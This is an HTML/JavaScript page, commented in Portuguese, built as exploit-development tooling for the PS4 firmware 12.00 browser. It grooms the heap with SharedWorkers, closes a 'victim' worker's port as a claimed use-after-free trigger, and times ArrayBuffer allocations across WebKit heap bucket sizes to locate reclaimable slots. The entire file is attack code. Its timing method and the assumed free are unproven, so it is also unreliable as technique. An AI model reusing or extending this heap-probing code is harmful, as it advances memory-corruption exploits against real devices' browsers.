<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 CONTINUOUS X-RAY</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
        #stats { border: 1px solid #004400; width: 90%; margin: 20px auto; padding: 15px; text-align: left; font-size: 16px; background: #051105; }
        .bar-container { margin-bottom: 5px; display: flex; align-items: center; }
        .label { width: 80px; font-weight: bold; }
        .bar { height: 20px; background: #00cc00; transition: width 0.2s; }
        .value { margin-left: 10px; color: #fff; }
        button { padding: 15px 40px; font-size: 18px; cursor: pointer; background: #005500; color: white; border: 2px solid #0f0; border-radius: 8px; }
        .hotspot { color: #ff0055; font-weight: bold; }
    </style>
</head>
<body>

    <h1>CONTINUOUS MEMORY X-RAY</h1>
    <h3>Monitorando latência de alocação em tempo real</h3>
    
    <button id="btn_action" onclick="toggleScan()">INICIAR SCAN CONTÍNUO</button>
    
    <div id="stats">Aguardando dados...</div>
    <div id="log" style="height:100px; overflow:hidden; color:#555; font-size:10px;"></div>

    <script>
        var isRunning = false;
        var workers = [];
        
        // Tamanhos suspeitos (Buckets do WebKit/IsoHeap)
        // Focamos nos pequenos e médios
        var SIZES = [
            0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80, 
            0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0,
            0x100, 0x120, 0x140, 0x180, 0x200, 0x400
        ];

        // Acumulador de estatísticas
        var stats = {};
        SIZES.forEach(s => stats[s] = { totalTime: 0, count: 0, max: 0 });

        function toggleScan() {
            if (isRunning) {
                isRunning = false;
                document.getElementById("btn_action").innerText = "INICIAR SCAN CONTÍNUO";
                document.getElementById("btn_action").style.backgroundColor = "#005500";
            } else {
                isRunning = true;
                document.getElementById("btn_action").innerText = "PARAR SCAN";
                document.getElementById("btn_action").style.backgroundColor = "#880000";
                runLoop();
            }
        }

        // Medição de precisão
        function measure_alloc(size) {
            var t0 = performance.now();
            // Alocamos e soltamos imediatamente para testar a velocidade do slot
            var ab = new ArrayBuffer(size);
            var t1 = performance.now();
            return t1 - t0;
        }

        async function runLoop() {
            // 1. Grooming Leve (Manter heap ativo)
            for(let i=0; i<50; i++) {
                try { workers.push(new SharedWorker("data:text,1", "g"+Math.random())); } catch(e){}
            }

            while(isRunning) {
                // 2. Cria Vítima
                var victim = null;
                try {
                    victim = new SharedWorker("data:text,1", "probe_" + Math.random());
                    victim.port.start();
                } catch(e) {
                    // Se falhar alocação, limpa um pouco
                    if(workers.length > 0) workers.pop().port.close();
                    await new Promise(r => setTimeout(r, 100));
                    continue;
                }

                // 3. MOMENTO DO FREE (Gatilho UAF)
                victim.port.close();
                
                // 4. MEDIÇÃO IMEDIATA (Raio-X)
                // Tenta alocar todos os tamanhos e vê qual demora mais
                // (O que demorar mais é provável que esteja lidando com a fragmentação do free)
                
                for (let size of SIZES) {
                    let time = measure_alloc(size);
                    
                    // Atualiza estatísticas
                    stats[size].totalTime += time;
                    stats[size].count++;
                    if (time > stats[size].max) stats[size].max = time;
                }

                // Atualiza UI a cada 10 ciclos
                if (stats[SIZES[0]].count % 10 === 0) updateUI();

                // Yield para não travar o navegador
                await new Promise(r => setTimeout(r, 10));
            }
            
            // Limpeza ao parar
            workers.forEach(w => w.port.close());
            workers = [];
        }

        function updateUI() {
            var html = "<strong>LATÊNCIA MÉDIA DE ALOCAÇÃO (ms):</strong><br><br>";
            
            // Encontra o pior tempo para escala
            var globalMax = 0;
            SIZES.forEach(s => {
                var avg = stats[s].totalTime / stats[s].count;
                if (avg > globalMax) globalMax = avg;
            });

            SIZES.forEach(s => {
                var avg = stats[s].totalTime / stats[s].count;
                var pct = (avg / globalMax) * 100;
                var hex = "0x" + s.toString(16).toUpperCase();
                
                var color = "#00cc00";
                var labelClass = "";
                
                // Destaca se for muito lento (Hotspot)
                if (avg > globalMax * 0.8) {
                    color = "#ff0055";
                    labelClass = "hotspot";
                } else if (avg > globalMax * 0.5) {
                    color = "#ffaa00";
                }

                html += `
                <div class="bar-container">
                    <div class="label ${labelClass}">${hex}</div>
                    <div class="bar" style="width: ${pct}%; background-color: ${color};"></div>
                    <div class="value">${avg.toFixed(4)} ms (Max: ${stats[s].max.toFixed(2)})</div>
                </div>`;
            });

            document.getElementById("stats").innerHTML = html;
        }
    </script>
</body>
</html>
